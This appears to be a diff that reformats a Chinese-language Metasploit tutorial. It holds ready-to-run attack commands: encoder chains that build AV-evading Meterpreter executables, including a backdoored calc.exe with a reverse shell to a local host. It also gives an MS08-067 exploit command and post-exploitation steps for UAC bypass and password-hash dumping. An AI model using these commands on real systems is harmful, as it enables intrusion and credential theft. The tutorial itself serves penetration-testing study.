@@ -1264,7 +1264,7 @@ msf> resource karma.rc
 这三章留着后面看，需要有ruby基础等编程基础。
 
 
-### 十四．渗透实战演习
+## 十四．渗透实战演习
 
 首先需要下载并安装一个专门用来练习渗透的虚拟机Metasploitable：
 
@@ -1429,21 +1429,24 @@ exploit
 * msfencode -l 查看可用encoder
 * msfencode -t (c,elf.exe,java.js_le,js_be,perl,raw,ruby,vba,vbs,loop-vbs,asp,war,macho) 以指定格式显示编码后的buffer
 * msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe 生成编码后的exe
-* msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -e x86/countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded.exe 多编码器结合，多次编码
 * msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c 生成纯字符格式C类型shellcode
+* msfpayload windows/meterpreter/bind_tcp LPORT=443 R | \
+  msfencode -e x86/countdown -c 5 -t raw | \
+  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded.exe 多编码器结合，多次编码
 
 ### MSFcli Commands
 
-* msfcli |grep exploit 只显示exploit
-* msfcli | grep exploit/windows 只显示windows exploit
-* msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.26 E 针对指定IP加载指定exp并设定payload
+* `msfcli | grep exploit` 只显示exploit
+* `msfcli | grep exploit/windows` 只显示windows exploit
+* `msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.26 E` 针对指定IP加载指定exp并设定payload
 
 
 ### MSF,Ninja，Fu
-
+```
 * msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 使用calc.exe作为模板，生成经过编码的后门
 * msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc,exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 与上面差不多，只是执行的时候不依赖于生成的可执行文件，且不会有任何提示信息
 * msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe && msfcli multi/hanler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E 生成编码后的payload并开始监听本机端口
+```
 
 ### MSFvenom
 
@@ -1501,12 +1504,10 @@ meterpreter> run getcountermeasure -h
 meterpreter> run getcountermeasure -d -k
 ```
 
-```
-meterpreter> run checkvm 检查是否是虚拟机
-meterpreter> shell 转入命令行
-meterpreter> run vnc 远程VNC控制
-meterpreter> background 转入后台
-meterpreter> run post/windows/escalate/bypassuac 执行Bypass UAC
-meterpreter> run post/osx/gather/hashdump 在OS X系统上dump hash
-meterpreter> run post/linux/gather/hashdump 在Linux 系统上dump hash
-```
+* meterpreter> run checkvm 检查是否是虚拟机
+* meterpreter> shell 转入命令行
+* meterpreter> run vnc 远程VNC控制
+* meterpreter> background 转入后台
+* meterpreter> run post/windows/escalate/bypassuac 执行Bypass UAC
+* meterpreter> run post/osx/gather/hashdump 在OS X系统上dump hash
+* meterpreter> run post/linux/gather/hashdump 在Linux 系统上dump hash
